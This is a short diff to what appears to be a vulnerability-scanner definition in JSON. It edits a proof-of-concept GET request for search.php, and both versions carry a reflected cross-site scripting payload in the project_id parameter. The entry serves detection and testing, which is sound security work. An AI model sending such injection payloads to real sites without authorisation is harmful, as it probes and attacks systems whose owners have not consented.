@@ -163,7 +163,7 @@
     "is_affected": "affected",
     "poc": {
       "method": "GET",
-      "url": "search.php?project_id=\"><script>alert(0)</script>&hide_status_id=1&HACKID=YSK",
+      "url": "search.php?project_id=\"><script>alert(0)</script>&hide_status_id=1",
       "header": "",
       "body": ""
     }
